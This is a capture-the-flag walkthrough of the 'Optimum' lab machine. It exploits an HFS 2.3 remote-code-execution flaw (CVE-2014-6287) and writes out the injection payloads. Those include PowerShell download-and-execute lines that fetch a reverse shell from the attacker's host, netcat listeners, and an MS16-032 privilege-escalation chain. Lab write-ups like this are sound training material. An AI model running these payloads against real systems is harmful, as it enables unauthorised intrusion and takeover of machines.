Optimum is a smooth transition from Easy to Medium on the platform. Simple concepts taken a step further.

```

By the looks of our scan, seems that all we have open is port 80 hosting a HFS running version 2.3. Let's dive in.
### Enumeration
##### Port 80:

The landing page for the website has a few interactive aspects, including a login portal. I'd tried a few default credentials, but no dice. I could try and brute force using hydra or burp, but I think we should table that vector until we've got nothing else.

A bit of digging brings us to CVE-2014-6287, which allows us to use nullbytes (`%00`) to define the end of a registered search query, but not the end of our `GET /` request. Theoretically, we should be able to append our RCE to the end of our request like so:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.3.}
```

Notice how it's URL encoded (`^U` and `SHIFT+^U` to toggle in Burp), and it also uses `/c` to specify `$PATH` for the command we give. If I TCP dump this (`tcpdump -i tun0`), notice we get our result:

![Image](/assets/Screenshot 2024-09-09 at 10.04.17 AM.png)

To pop a shell, let's use the Nishang. It's a huge repository on github of scripts and payloads that enable PowerShell for our needs. Once we've downloaded and installed the tool, let's take a look at our options.

![Image](/assets/Screenshot 2024-09-09 at 10.09.32 AM.png)

Let's use the Invoke TCP OneLiner. We can use `cp` to copy its contents to a file called `revtcp.ps1`, and from there, we can `vim` into the file and uncomment the command, as well as change the IP/PORT `(10.10.14.3/4321)` to match our needs. 

![Image](/assets/Screenshot 2024-09-09 at 10.15.41 AM.png)

Once this is done, set up the listener by using the port specified, in my case, it was 4321. Don't forget the `rlwrap`!

`rlwrap nc -nlvp 4321`

Before we can throw the RCE into our header request with Burp, we need to serve this file with a SimpleHTTP server using Python. The server will host everything in the directory its spun in, so lets move our file to our `/home/` directory and spin our server there using `python -m SimpleHTTPServer 80`.

Now when we craft our request, architecture plays a very big role in completing our compromise of this system. Different paths work for different architectures, and the table below is an example. `c:\Windows\System32` and `c:\Windows\SysWow64` are both for 32-bit libraries. `c:\Windows\SysNative` is what we want here, as it's called for 64 bit libraries. I think (key word) that the session we launch is 32 bit, and in order to interact with the target machine in an efficient way, we need the 64 bit folder. SysNative meets both of those requirements.

![Image](/assets/Screenshot 2024-09-09 at 10.24.09 AM.png)

This means that our PowerShell must be called correctly if we want it to function correctly.

`/?search=%00{.+exec|c:\Windows\SysNative\WindowsPowerShell1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/revtcp.ps1').}`

MAKE SURE EVERYTHING IS SQUARE. URL encoded, correct paths, listeners, etc.

![Image](/assets/Screenshot 2024-09-09 at 10.42.16 AM.png)

We should get notified on our Python server and Netcat listener as well

![Image](/assets/Screenshot 2024-09-09 at 10.46.43 AM.png)

Once here, we can start to get information. `ps` and `systeminfo`, as always.

![Image](/assets/Screenshot 2024-09-09 at 10.48.37 AM.png)

We can see x64 structure, and we can pat ourselves on the back for making our lives easier earlier. 

Not much rooting around necessary for the user flag, as we spawned in the `/Users/kostas/Desktop` directory. Simply request `more user.txt`:

`USER:09a0c26d9fe478f0f4a349d99fc8cfc4`

### Privilege Escalation

For privilege escalation, we're going to use a tool called Sherlock, which is a privilege escalation PowerShell tool that was created for Windows about 7 years ago. There's an updated version out by the same author now called Watson. I'm going to download both, but we're using Sherlock for this box given the age and parameters of the machine. `cd` to the `/opt` directory and clone the repo.

`git clone https://github.com/rasta-mouse/Sherlock.git`

Once finished, we're going to copy it into our chosen directory to edit and serve the payload. `cp` to copy to another file, and `mv` to move as I discussed above. There are plenty of function options in the script, but for now, we're going to append `function Find-AllVulns` to the end of our `.ps1` file.

![Image](/assets/Screenshot 2024-09-09 at 11.09.42 AM.png)

Now, to download served contents on our Python server, we can use the following script used before:

`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/dasp.ps1')` 

(I chose the name `dasp.ps1` Dunno why...)

Here is our output below:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/dasp.ps1')

If we google MS16-032, we can find a script that allows for privilege escalation. The problem is, this requires an interactive session, and seeing as we just have a command prompt, we'll need to find (or create) a modified version. Thankfully, Empire has created a script for this specific purpose. We can download their entire framework.

`git clone https://github.com/EmpireProject/Empire.git`

Then we can `cd` to the `/opt/Empire/data/module_source/privesc` to find the `Invoke-MS16032.ps1` file. `cp` the file to the directory being served, and append the command below to the end our file.

````
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:4322/revtcp.ps1')"
````

Now, go back into your original `revtcp.ps1`, and change the port being to serve any other than the previous one. I chose `4322`. Then, use `nlwrap nc -nlvp` to set up a listener on that port.

Finally, go back to your user shell, and type the following

`IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-MS16032.ps1')`

This will serve our new privesc script and grant us a higher privilege shell in our other netcat session.

Once here, we can `cd ../` to backtrack and find our way to the root flag.
